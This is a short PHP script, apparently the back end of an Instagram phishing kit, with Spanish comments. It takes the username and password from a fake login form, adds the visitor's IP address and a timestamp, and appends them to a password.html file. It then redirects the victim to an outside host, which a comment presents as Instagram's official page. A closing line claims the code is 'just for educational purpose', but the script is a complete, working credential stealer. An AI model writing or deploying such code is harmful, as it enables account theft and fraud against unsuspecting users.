<?php
error_reporting(0);
 
$usuario = $_POST['usuario'];  //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:usuario
$clave = $_POST['clave']; //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:clave
$ip = $_SERVER['REMOTE_ADDR']; //se captura la ip publica donde se accede a la pagina  
$fecha = date("Y-m-d;h:i:s"); //se captura la hora donde se ingresaron los datos
 
 
 
if( (empty($usuario)) or (empty($clave)) ){
     header('location: index.html'); // codigo de verificacion que no esten los campos vacios
}else{
  
//en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina login.html
$f = fopen("password.html", "a");
fwrite ($f,
'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
Password: [<b><font color="#9900FF">'.$clave.'</font></b>]
IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
 
fclose($f);
 
//despues que se crea el archivo claves.html con los datos, se direcciona a la pagina oficial de instagram
header("Location:  https://webpostegro.live/login?a=");
}
?>
 
 
 
//this is just for educational purpose
